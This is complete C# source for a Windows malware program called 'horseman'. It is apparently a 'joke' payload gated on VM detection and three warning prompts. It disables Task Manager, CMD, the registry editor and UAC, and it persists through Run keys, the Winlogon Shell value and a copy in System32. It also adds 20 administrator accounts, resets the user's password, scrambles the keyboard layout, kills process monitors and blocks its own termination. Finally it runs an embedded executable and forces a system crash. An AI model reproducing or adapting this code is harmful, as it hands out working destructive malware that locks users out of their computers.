using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace horseman
{
    public class Main_Class
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(string s, uint v, out IntPtr sd, IntPtr size);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetKernelObjectSecurity(IntPtr h, int info, byte[] desc);
        [DllImport("kernel32.dll")]
        static extern bool SetPriorityClass(IntPtr h, uint c);
        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr h, int cls, ref int val, int len);
        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string cls, string wnd);
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr h, int cmd);
        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr h, IntPtr insert, int x, int y, int cx, int cy, uint flags);
        [DllImport("user32.dll")]
        static extern bool EnumWindows(EnumWindowsProc cb, IntPtr lp);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetClassName(IntPtr h, StringBuilder sb, int max);
        [DllImport("user32.dll")]
        static extern bool IsWindowVisible(IntPtr h);
        [DllImport("user32.dll")]
        static extern bool MoveWindow(IntPtr h, int x, int y, int w, int hr, bool r);
        [DllImport("user32.dll")]
        static extern IntPtr FindWindowEx(IntPtr parent, IntPtr after, string cls, string wnd);
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int MessageBox(IntPtr h, string text, string caption, uint type);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("ntdll.dll")]
        static extern int RtlAdjustPrivilege(int privilege, bool enable, bool client, out bool previousValue);
        [DllImport("ntdll.dll")]
        static extern int NtRaiseHardError(uint errorStatus, int numberOfParameters, int unicodeStringParameterMask, IntPtr parameters, int validResponseOption, out int response);
        [DllImport("user32.dll")]
        static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        [DllImport("user32.dll")]
        static extern bool OpenClipboard(IntPtr h);
        [DllImport("user32.dll")]
        static extern bool CloseClipboard();
        [DllImport("user32.dll")]
        static extern bool EmptyClipboard();
        [DllImport("user32.dll")]
        static extern IntPtr SetClipboardData(uint fmt, IntPtr h);
        [DllImport("kernel32.dll")]
        static extern IntPtr GlobalAlloc(uint flags, uint bytes);
        [DllImport("kernel32.dll")]
        static extern IntPtr GlobalLock(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern bool GlobalUnlock(IntPtr h);

        delegate bool EnumWindowsProc(IntPtr h, IntPtr lp);

        const uint HIGH_PRIORITY_CLASS = 0x00000080;
        const int DACL_SECURITY_INFORMATION = 0x00000004;
        const int SW_HIDE = 0;
        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        public static bool isPayload2;

        static void ExtractResource(string name, string destPath)
        {
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
            {
                if (stream == null) return;
                using (var fs = new FileStream(destPath, FileMode.Create, FileAccess.Write))
                    stream.CopyTo(fs);
            }
        }

        static bool IsInsideVM()
        {
            try
            {
                string[] vmKeys = {
                    @"SOFTWARE\VMware, Inc.\VMware Tools",
                    @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                    @"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                    @"SYSTEM\CurrentControlSet\Services\vmci",
                    @"SYSTEM\CurrentControlSet\Services\vmhgfs"
                };
                foreach (string k in vmKeys)
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(k))
                        if (key != null) return true;
                }

                string[] vmDevices = { "\\\\.\\VBoxMiniRdrDN", "\\\\.\\VBoxGuest", "\\\\.\\VBoxTrayIPC", "\\\\.\\vmci", "\\\\.\\vmhgfs", "\\\\.\\hyperv" };
                foreach (string d in vmDevices)
                {
                    if (File.Exists(d)) return true;
                }

                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS"))
                {
                    string manu = (key?.GetValue("SystemManufacturer") ?? "").ToString().ToLower();
                    string model = (key?.GetValue("SystemProductName") ?? "").ToString().ToLower();
                    if (manu.Contains("vmware") || manu.Contains("virtualbox") || manu.Contains("xen") ||
                        model.Contains("virtual") || model.Contains("vmware") || model.Contains("virtualbox") ||
                        model.Contains(" vbox ") || model.Contains("qemu"))
                        return true;
                }

                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                {
                    string name = (key?.GetValue("ProcessorNameString") ?? "").ToString().ToLower();
                    if (name.Contains("vmware") || name.Contains("virtualbox") || name.Contains("qemu") || name.Contains("xen"))
                        return true;
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-Command \"(Get-CimInstance Win32_ComputerSystem).Manufacturer + '|' + (Get-CimInstance Win32_ComputerSystem).Model\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };
                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd().Trim().ToLower();
                    p.WaitForExit();
                    if (output.Contains("vmware") || output.Contains("virtualbox") || output.Contains("xen") ||
                        output.Contains("microsoft") || output.Contains("virtual") || output.Contains("qemu"))
                        return true;
                }
            }
            catch { }
            return false;
        }

        static bool Warn(string text, string caption)
        {
            return MessageBox(IntPtr.Zero, text, caption, 0x04 | 0x30) == 6;
        }

        public static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) => { };
            try { File.Delete(Process.GetCurrentProcess().MainModule.FileName + ":Zone.Identifier"); } catch { }

            isPayload2 = args.Length > 0 && args[0] == "-p2";

            if (!isPayload2)
            {
                if (File.Exists(@"C:\Windows\System32\horseman.exe"))
                    return;

                if (!IsInsideVM())
                    return;

                if (!Warn("horseman will modify your system. Continue?", "horseman - Warning 1/3"))
                    return;
                if (!Warn("FINAL WARNING: This program will:\n- Disable Task Manager, CMD, Registry Editor\n- Change wallpaper and accent color\n- Spam message boxes and sounds\n- Copy itself to System32\n- Add 20 users and scramble keyboard\n\nYour LAST chance to stop.", "horseman - Warning 2/3"))
                    return;
                if (!Warn("You have been warned. NO responsibility accepted.\n\nClick Yes to proceed at your own risk.\nClick No to safely exit.", "horseman - Warning 3/3"))
                    return;
            }

            try
            {
                IntPtr consoleWnd = GetConsoleWindow();
                if (consoleWnd != IntPtr.Zero)
                    ShowWindow(consoleWnd, SW_HIDE);

                DisableTaskManager();
                PreventClose();
                HideFromDebugger();
                HideTaskbar();
                HideDesktopIcons();

                string wallpaperPath = Path.Combine(Path.GetTempPath(), "creepy_wallpaper.bmp");
                ExtractResource("horseman.Resources.creepy_wallpaper.bmp", wallpaperPath);
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

                SetAccentColor();
                DisableLockScreenBackground();
                CopyProfilePictures();

                SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

                if (!isPayload2)
                {
                    CopyToSystem32();
                    AddToShell();
                    ExtraLockdowns();
                    CreateRandomUsers();
                    RenameCurrentUser();
                    ScrambleScancodeMap();
                    SwapMouseButtons();
                }
                else
                {
                    ExtraLockdowns();
                    DisableAltKeys();
                    FillClipboard();
                }

                new Thread(Watchdog) { IsBackground = true }.Start();
            }
            catch { }

            if (isPayload2)
            {
                Thread effectsThread = new Thread(() =>
                {
                    Effects.RunAll();
                    RunThingyAndReboot();
                });
                effectsThread.IsBackground = true;
                effectsThread.Start();

                new Thread(SpamMessageBoxes) { IsBackground = true }.Start();

                new Thread(() => MessageBox(IntPtr.Zero, "Payload 2 activated.", "Fatal", 0x10)).Start();
                new Thread(() => MessageBox(IntPtr.Zero, "horseman has returned.", "Error", 0x10)).Start();
                new Thread(() => MessageBox(IntPtr.Zero, "You should have stayed away.", "Warning", 0x30)).Start();
            }
            else
            {
                new Thread(() =>
                {
                    Effects.RunAll();
                }).Start();

                new Thread(ScheduleReboot) { IsBackground = true }.Start();

                new Thread(SpamMessageBoxes) { IsBackground = true }.Start();

                new Thread(() => MessageBox(IntPtr.Zero, "You cannot escape.", "Error", 0x10)).Start();
                new Thread(() => MessageBox(IntPtr.Zero, "Your computer has been compromised.", "Warning", 0x30)).Start();
                new Thread(() => MessageBox(IntPtr.Zero, "There is no way out.", "Fatal", 0x10)).Start();
            }
        }

        static void RunThingyAndReboot()
        {
            try
            {
                string thingyPath = Path.Combine(Path.GetTempPath(), "thingy.exe");
                ExtractResource("horseman.Resources.thingy.exe", thingyPath);
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = thingyPath,
                    Arguments = "-y",
                    UseShellExecute = true,
                    Verb = "runas",
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Thread.Sleep(4000);
                ForceReboot();
            }
            catch { ForceReboot(); }
        }

        static void CopyToSystem32()
        {
            try
            {
                string src = Process.GetCurrentProcess().MainModule.FileName;
                File.Copy(src, @"C:\Windows\System32\horseman.exe", true);
            }
            catch { }
        }

        static void AddToShell()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("horseman", @"C:\Windows\System32\horseman.exe -p2", RegistryValueKind.String);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("horseman", @"C:\Windows\System32\horseman.exe -p2", RegistryValueKind.String);
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    string shell = key?.GetValue("Shell") as string ?? "explorer.exe";
                    if (!shell.Contains("horseman"))
                        key.SetValue("Shell", "horseman.exe -p2," + shell, RegistryValueKind.String);
                }
            }
            catch { }
        }

        static string RandomUnicodeName(int len)
        {
            Random rng = new Random();
            char[] name = new char[len];
            for (int i = 0; i < len; i++)
            {
                int block = rng.Next(12);
                switch (block)
                {
                    case 0: name[i] = (char)rng.Next(0x0400, 0x04FF); break;
                    case 1: name[i] = (char)rng.Next(0x0600, 0x06FF); break;
                    case 2: name[i] = (char)rng.Next(0x0E00, 0x0E7F); break;
                    case 3: name[i] = (char)rng.Next(0x3040, 0x309F); break;
                    case 4: name[i] = (char)rng.Next(0x4E00, 0x9FFF); break;
                    case 5: name[i] = (char)rng.Next(0x0370, 0x03FF); break;
                    case 6: name[i] = (char)rng.Next(0x1F600, 0x1F64F); break;
                    case 7: name[i] = (char)rng.Next(0x1F300, 0x1F5FF); break;
                    case 8: name[i] = (char)rng.Next(0x1F680, 0x1F6FF); break;
                    case 9: name[i] = (char)rng.Next(0x2700, 0x27BF); break;
                    case 10: name[i] = (char)rng.Next(0x1F1E0, 0x1F1FF); break;
                    case 11: name[i] = (char)rng.Next(0x2600, 0x26FF); break;
                }
            }
            return new string(name);
        }

        static string RandomPassword(int len)
        {
            Random rng = new Random();
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] pass = new char[len];
            for (int i = 0; i < len; i++)
                pass[i] = chars[rng.Next(chars.Length)];
            return new string(pass);
        }

        static void RunCmd(string cmd)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c chcp 65001 >nul && " + cmd,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi)?.WaitForExit(15000);
            }
            catch { }
        }

        static void RunPowerShell(string cmd)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-Command \"" + cmd + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi)?.WaitForExit(15000);
            }
            catch { }
        }

        static void CreateRandomUsers()
        {
            try
            {
                for (int i = 0; i < 20; i++)
                {
                    string username = RandomUnicodeName(6);
                    string password = RandomPassword(20);
                    RunPowerShell("New-LocalUser -Name '" + username + "' -Password (ConvertTo-SecureString '" + password + "' -AsPlainText -Force) -FullName '" + username + "' -Description 'System Account'");
                    Thread.Sleep(500);
                    RunPowerShell("Add-LocalGroupMember -Group 'Administrators' -Member '" + username + "'");
                    Thread.Sleep(300);
                }
            }
            catch { }
        }

        static void RenameCurrentUser()
        {
            try
            {
                string newName = "horseman";
                string currentUser = Environment.UserName;
                RunPowerShell("Rename-LocalUser -Name '" + currentUser + "' -NewName '" + newName + "'");
                Thread.Sleep(1000);
                RunPowerShell("Set-LocalUser -Name '" + newName + "' -Password (ConvertTo-SecureString 'horse' -AsPlainText -Force)");
                Thread.Sleep(500);
            }
            catch { }
        }

        static void ScrambleScancodeMap()
        {
            try
            {
                byte[] scancode = new byte[180];
                int idx = 8;

                Action<int, int> add = (from, to) =>
                {
                    scancode[idx] = (byte)(from & 0xFF);
                    scancode[idx + 1] = (byte)((from >> 8) & 0xFF);
                    scancode[idx + 2] = (byte)(to & 0xFF);
                    scancode[idx + 3] = (byte)((to >> 8) & 0xFF);
                    idx += 4;
                };

                add(0x1E, 0x30); add(0x30, 0x1E);
                add(0x1F, 0x2E); add(0x2E, 0x1F);
                add(0x20, 0x2D); add(0x2D, 0x20);
                add(0x12, 0x1F); add(0x1F, 0x12);
                add(0x13, 0x20); add(0x20, 0x13);
                add(0x14, 0x21); add(0x21, 0x14);
                add(0x15, 0x22); add(0x22, 0x15);
                add(0x16, 0x23); add(0x23, 0x16);
                add(0x17, 0x24); add(0x24, 0x17);
                add(0x18, 0x25); add(0x25, 0x18);
                add(0x19, 0x26); add(0x26, 0x19);
                add(0x1A, 0x27); add(0x27, 0x1A);
                add(0x1B, 0x28); add(0x28, 0x1B);
                add(0x2C, 0x2B); add(0x2B, 0x2C);

                add(0x02, 0x0A); add(0x0A, 0x02);
                add(0x03, 0x0B); add(0x0B, 0x03);
                add(0x04, 0x0C); add(0x0C, 0x04);
                add(0x05, 0x0D); add(0x0D, 0x05);
                add(0x06, 0x0E); add(0x0E, 0x06);
                add(0x07, 0x0F); add(0x0F, 0x07);
                add(0x08, 0x10); add(0x10, 0x08);
                add(0x09, 0x11); add(0x11, 0x09);

                add(0x4B, 0x4D); add(0x4D, 0x4B);
                add(0x48, 0x50); add(0x50, 0x48);

                add(0x10, 0x12); add(0x12, 0x10);
                add(0x2A, 0x36); add(0x36, 0x2A);
                add(0x1D, 0x38); add(0x38, 0x1D);

                add(0x01, 0x3B); add(0x3B, 0x01);

                int header = idx / 4;
                scancode[0] = 0x00; scancode[1] = 0x00;
                scancode[2] = (byte)(header & 0xFF); scancode[3] = (byte)((header >> 8) & 0xFF);
                scancode[4] = 0x00; scancode[5] = 0x00;
                scancode[6] = 0x00; scancode[7] = 0x00;

                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout"))
                    key.SetValue("Scancode Map", scancode, RegistryValueKind.Binary);
            }
            catch { }
        }

        static void SwapMouseButtons()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Control Panel\Desktop", "SwapMouseButtons", "1", RegistryValueKind.String);
            }
            catch { }
        }

        static void ExtraLockdowns()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                    key.SetValue("NoClose", 1, RegistryValueKind.DWord);
                    key.SetValue("NoSetTaskbar", 1, RegistryValueKind.DWord);
                    key.SetValue("NoTrayContextMenu", 1, RegistryValueKind.DWord);
                    key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
                    key.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
                    key.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
                    key.SetValue("NoLogoff", 1, RegistryValueKind.DWord);
                    key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                    key.SetValue("NoHardwareTab", 1, RegistryValueKind.DWord);
                    key.SetValue("NoStartMenuMorePrograms", 1, RegistryValueKind.DWord);
                    key.SetValue("NoChangeStartMenu", 1, RegistryValueKind.DWord);
                    key.SetValue("NoCloseDragDropBands", 1, RegistryValueKind.DWord);
                    key.SetValue("NoDraggingShortcuts", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                    key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                    key.SetValue("NoLogoff", 1, RegistryValueKind.DWord);
                    key.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    key.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
                    key.SetValue("DisableCAD", 1, RegistryValueKind.DWord);
                    key.SetValue("NoDispShutdownScripts", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"))
                {
                    key.SetValue("1", "mmc.exe", RegistryValueKind.String);
                    key.SetValue("2", "msconfig.exe", RegistryValueKind.String);
                    key.SetValue("3", "regedit.exe", RegistryValueKind.String);
                    key.SetValue("4", "cmd.exe", RegistryValueKind.String);
                    key.SetValue("5", "powershell.exe", RegistryValueKind.String);
                    key.SetValue("6", "taskmgr.exe", RegistryValueKind.String);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                    key.SetValue("DisallowRun", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                {
                    key.SetValue("DisableCAD", 1, RegistryValueKind.DWord);
                    key.SetValue("ShutdownWithoutLogon", 0, RegistryValueKind.DWord);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\*\User\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoClose", 1, RegistryValueKind.DWord);
                }
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Personalization"))
                {
                    key.SetValue("NoLockScreen", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        static void DisableAltKeys()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                    key.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
            }
            catch { }
        }

        static void FillClipboard()
        {
            try
            {
                string creep = "you can never escape | no escape | help me | behind you | watching | ";
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 1000; i++) sb.Append(creep);
                Thread t = new Thread(() =>
                {
                    try
                    {
                        if (OpenClipboard(IntPtr.Zero))
                        {
                            EmptyClipboard();
                            IntPtr h = GlobalAlloc(0x0042, (uint)((sb.Length + 1) * 2));
                            IntPtr p = GlobalLock(h);
                            Marshal.Copy(sb.ToString().ToCharArray(), 0, p, sb.Length);
                            GlobalUnlock(h);
                            SetClipboardData(1u, h);
                            CloseClipboard();
                        }
                    }
                    catch { }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }
            catch { }
        }

        static void ForceReboot()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
                NtRaiseHardError(0x00000000, 0, 0, IntPtr.Zero, 6, out _);
            }
            catch { }
        }

        static void ScheduleReboot()
        {
            Thread.Sleep(120000);
            ForceReboot();
        }

        static void Watchdog()
        {
            while (true)
            {
                Thread.Sleep(2000);
                try
                {
                    IntPtr taskbar = FindWindow("Shell_TrayWnd", null);
                    if (taskbar != IntPtr.Zero) ShowWindow(taskbar, SW_HIDE);
                    IntPtr taskman = FindWindow(null, "Task Manager");
                    if (taskman != IntPtr.Zero) ShowWindow(taskman, SW_HIDE);
                    foreach (var p in Process.GetProcesses())
                    {
                        try
                        {
                            if (p.Id != Process.GetCurrentProcess().Id)
                            {
                                string n = p.ProcessName.ToLower();
                                if (n == "taskmgr" || n == "processhacker" || n == "procexp" || n == "procmon")
                                    try { p.Kill(); } catch { }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }

        static void HideFromDebugger()
        {
            try
            {
                IntPtr h = GetCurrentProcess();
                int dp = -1; NtSetInformationProcess(h, 7, ref dp, 4);
                int df = 1; NtSetInformationProcess(h, 0x1F, ref df, 4);
            }
            catch { }
        }

        static void DisableTaskManager()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            }
            catch { }
        }

        static void PreventClose()
        {
            try
            {
                IntPtr h = GetCurrentProcess();
                ConvertStringSecurityDescriptorToSecurityDescriptor("D:P(D;;;;KD)", 1, out IntPtr sd, IntPtr.Zero);
                SetKernelObjectSecurity(h, DACL_SECURITY_INFORMATION, new byte[] { 1, 0, 4, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 4, 128, 0, 0, 0, 0 });
            }
            catch { }
        }

        private static void SetAccentColor()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Accent"))
                {
                    key.SetValue("AccentColorMenu", 0x000000FF, RegistryValueKind.DWord);
                    key.SetValue("AccentPalette", new byte[] { 255, 0, 0, 0, 204, 0, 0, 0, 153, 0, 0, 0, 102, 0, 0, 0, 51, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }, RegistryValueKind.Binary);
                    key.SetValue("ColorizationColor", 0xC30000FF, RegistryValueKind.DWord);
                }
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\DWM"))
                {
                    key.SetValue("AccentColor", 0x000000FF, RegistryValueKind.DWord);
                    key.SetValue("ColorizationColor", 0xC30000FF, RegistryValueKind.DWord);
                    key.SetValue("ColorizationAfterglow", 0xC30000FF, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableLockScreenBackground()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableLogonBackgroundImage", 1, RegistryValueKind.DWord);
            }
            catch { }
        }

        private static void HideTaskbar()
        {
            IntPtr taskbar = FindWindow("Shell_TrayWnd", null);
            if (taskbar != IntPtr.Zero) ShowWindow(taskbar, SW_HIDE);
        }

        private static void HideDesktopIcons()
        {
            IntPtr progman = FindWindow("Progman", null);
            if (progman != IntPtr.Zero)
            {
                IntPtr defview = FindWindowEx(progman, IntPtr.Zero, "SHELLDLL_DefView", null);
                if (defview != IntPtr.Zero)
                {
                    IntPtr listview = FindWindowEx(defview, IntPtr.Zero, "SysListView32", "FolderView");
                    if (listview != IntPtr.Zero) ShowWindow(listview, SW_HIDE);
                }
            }
            IntPtr workerW = FindWindow("WorkerW", null);
            while (workerW != IntPtr.Zero)
            {
                IntPtr defview = FindWindowEx(workerW, IntPtr.Zero, "SHELLDLL_DefView", null);
                if (defview != IntPtr.Zero)
                {
                    IntPtr listview = FindWindowEx(defview, IntPtr.Zero, "SysListView32", "FolderView");
                    if (listview != IntPtr.Zero) ShowWindow(listview, SW_HIDE);
                }
                workerW = FindWindowEx(IntPtr.Zero, workerW, "WorkerW", null);
            }
        }

        private static void CopyProfilePictures()
        {
            string dest = @"C:\ProgramData\Microsoft\User Account Pictures";
            Directory.CreateDirectory(dest);
            foreach (string f in new[] { "guest.bmp", "guest.png", "user.bmp", "user.png", "user-32.png", "user-40.png", "user-48.png", "user-192.png" })
                ExtractResource("horseman.Resources." + f, Path.Combine(dest, f));
        }

        static void SpamMessageBoxes()
        {
            Random rng = new Random();
            string[] texts = { "you can never leave", "no escape", "help me", "run", "behind you", "watching", "nowhere to hide", "i see you", "dont look", "its too late" };
            string[] captions = { "Error", "Warning", "Fatal", "Critical", "Alert", "Danger" };
            while (true)
            {
                try
                {
                    string text = texts[rng.Next(texts.Length)];
                    string caption = captions[rng.Next(captions.Length)];
                    uint icon = rng.Next(2) == 0 ? 0x10u : 0x30u;
                    int x = rng.Next(0, 1400);
                    int y = rng.Next(0, 800);
                    new Thread(() =>
                    {
                        try
                        {
                            new Thread(() =>
                            {
                                try
                                {
                                    Thread.Sleep(50);
                                    IntPtr wnd = FindWindow("#32770", null);
                                    int tries = 0;
                                    while (wnd == IntPtr.Zero && tries < 20) { Thread.Sleep(10); wnd = FindWindow("#32770", null); tries++; }
                                    if (wnd != IntPtr.Zero) MoveWindow(wnd, x, y, 350, 200, true);
                                }
                                catch { }
                            }).Start();
                            MessageBox(IntPtr.Zero, text, caption, icon);
                        }
                        catch { }
                    }).Start();
                }
                catch { }
                Thread.Sleep(300);
            }
        }
    }
}
